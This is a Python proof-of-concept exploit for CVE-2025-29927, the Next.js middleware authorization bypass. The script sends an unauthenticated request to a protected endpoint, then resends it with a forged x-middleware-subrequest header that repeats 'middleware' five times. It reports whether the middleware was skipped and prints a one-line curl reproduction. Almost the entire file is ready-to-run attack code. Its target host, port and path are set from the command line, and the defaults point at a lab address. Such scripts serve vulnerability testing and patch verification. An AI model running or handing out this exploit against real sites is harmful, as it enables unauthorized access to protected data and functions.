#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Next.js Middleware Authorization Bypass
# CVE            : CVE-2025-29927
# Vendor         : Vercel
# Product        : Next.js
# Affected       : 11.1.4 – 12.3.4, 13.0.0 – 13.5.8, 14.0.0 – 14.2.24, 15.0.0 – 15.2.2
# Type           : CWE-285 - Improper Authorization
# CVSS           : 9.1 (Critical)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-03-21
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-29927 — Next.js Middleware Authorization Bypass PoC

Demonstrates that an unauthenticated attacker can bypass Next.js middleware
(including auth checks) by injecting the internal x-middleware-subrequest
header with the middleware module name repeated 5 times.

ATTACK CHAIN:
  1. Send baseline unauthenticated request to protected endpoint (expect 401)
  2. Send same request with x-middleware-subrequest header containing
     middleware name repeated 5 times (triggers recursion guard)
  3. Middleware is skipped entirely — protected content returned (200)

PREREQUISITES:
  - Target running vulnerable Next.js (11.1.4 – 15.2.2) with middleware
  - Network access to the target

REFERENCES:
  - CVE-2025-29927
  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
  - https://www.exploit-db.com/exploits/52124
"""

import sys
import json
import http.client
import socket

# ANSI color codes for terminal output
class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

# The bypass header value for standard middleware location (v13+)
# Repeats "middleware" 5 times (colon-separated) to hit MAX_RECURSION_DEPTH
BYPASS_HEADER = "middleware:middleware:middleware:middleware:middleware"

# Default settings matching the lab environment
DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 3000
DEFAULT_PATH = "/api/protected"


def make_request(host, port, path, headers=None, timeout=10):
    """
    Make an HTTP GET request and return (status_code, headers_dict, body_str).
    Uses http.client from stdlib — no external dependencies.
    """
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        all_headers = {"User-Agent": "CVE-2025-29927-PoC/1.0"}
        if headers:
            all_headers.update(headers)
        conn.request("GET", path, headers=all_headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.getheaders())
        status = resp.status
        conn.close()
        return status, resp_headers, body
    except socket.timeout:
        print(f"  {C.RED}[ERROR] Connection timed out to {host}:{port}{C.RESET}")
        return None, None, None
    except ConnectionRefusedError:
        print(f"  {C.RED}[ERROR] Connection refused at {host}:{port}{C.RESET}")
        return None, None, None
    except Exception as e:
        print(f"  {C.RED}[ERROR] {e}{C.RESET}")
        return None, None, None


def print_response(label, status, headers, body, indent="  "):
    """Pretty-print an HTTP response."""
    print(f"{indent}{C.CYAN}[{label}]{C.RESET}")
    print(f"{indent}  HTTP Status: {status}")

    # Try to pretty-print JSON body
    try:
        parsed = json.loads(body)
        body_display = json.dumps(parsed, indent=2)
        for line in body_display.split("\n"):
            print(f"{indent}  {line}")
    except (json.JSONDecodeError, TypeError):
        # Truncate non-JSON bodies
        truncated = body[:200] + ("..." if len(body) > 200 else "")
        print(f"{indent}  Body: {truncated}")


def exploit(host, port, path):
    """
    Run the CVE-2025-29927 middleware bypass exploit.

    Strategy:
      1. Send a normal unauthenticated request (baseline) — should be blocked (401)
      2. Send a request with the bypass header — should succeed (200)
      3. Compare results to confirm middleware was bypassed
    """
    target = f"http://{host}:{port}{path}"

    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} CVE-2025-29927 — Next.js Middleware Authorization Bypass PoC{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}")
    print(f"\n  Target: {C.YELLOW}{target}{C.RESET}")
    print(f"  Bypass Header: x-middleware-subrequest: {BYPASS_HEADER}")

    # ── Step 1: Baseline request (no auth, no bypass) ──
    print(f"\n{C.BOLD}[Step 1] Baseline — Unauthenticated request (should be 401){C.RESET}")
    baseline_status, baseline_headers, baseline_body = make_request(host, port, path)
    if baseline_status is None:
        print(f"\n  {C.RED}[FAIL] Could not connect to target. Is the server running?{C.RESET}")
        return False

    print_response("Baseline Response", baseline_status, baseline_headers, baseline_body)

    if baseline_status == 200:
        print(f"\n  {C.YELLOW}[WARN] Baseline returned 200 — endpoint may not be protected by middleware.{C.RESET}")
        print(f"  {C.YELLOW}        The exploit test will continue, but results may be inconclusive.{C.RESET}")

    # ── Step 2: Exploit — send the bypass header ──
    print(f"\n{C.BOLD}[Step 2] Exploit — Request with x-middleware-subrequest bypass header{C.RESET}")
    exploit_headers = {"x-middleware-subrequest": BYPASS_HEADER}
    exploit_status, exploit_resp_headers, exploit_body = make_request(
        host, port, path, headers=exploit_headers
    )
    if exploit_status is None:
        print(f"\n  {C.RED}[FAIL] Exploit request failed.{C.RESET}")
        return False

    print_response("Exploit Response", exploit_status, exploit_resp_headers, exploit_body)

    # ── Step 3: Evaluate results ──
    print(f"\n{C.BOLD}[Step 3] Evaluation{C.RESET}")
    print(f"  Baseline status: {baseline_status}")
    print(f"  Exploit status:  {exploit_status}")

    # Determine if the bypass succeeded
    bypass_confirmed = False

    if baseline_status in (401, 403, 307, 302) and exploit_status == 200:
        # Clear bypass: auth blocked baseline, but exploit got through
        bypass_confirmed = True
    elif baseline_status == 200 and exploit_status == 200:
        # Both returned 200 — check if content differs (middleware might add/remove headers or modify body)
        if baseline_body != exploit_body:
            print(f"  {C.YELLOW}[INFO] Both returned 200 but with different content — possible bypass.{C.RESET}")
            bypass_confirmed = True
        else:
            print(f"  {C.YELLOW}[WARN] Both returned 200 with same content — endpoint may not be middleware-protected.{C.RESET}")
    elif exploit_status == 200 and baseline_status != 200:
        bypass_confirmed = True

    # ── Final Verdict ──
    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    if bypass_confirmed:
        print(f"  {C.GREEN}{C.BOLD}[VULNERABLE] CVE-2025-29927 CONFIRMED{C.RESET}")
        print(f"  {C.GREEN}Middleware authorization was bypassed successfully.{C.RESET}")
        print(f"  {C.GREEN}The x-middleware-subrequest header caused Next.js to skip middleware.{C.RESET}")
        print()
        print(f"  {C.CYAN}Reproduction:{C.RESET}")
        print(f'  curl -H "x-middleware-subrequest: {BYPASS_HEADER}" {target}')
    else:
        print(f"  {C.RED}[NOT VULNERABLE] Bypass did not succeed.{C.RESET}")
        print(f"  {C.RED}The target may be patched or the middleware path may differ.{C.RESET}")
        print(f"  {C.RED}Try specifying a different path, or use poc_vector2.py for alternate vectors.{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}\n")

    return bypass_confirmed


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    path = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_PATH

    success = exploit(host, port, path)
    sys.exit(0 if success else 1)
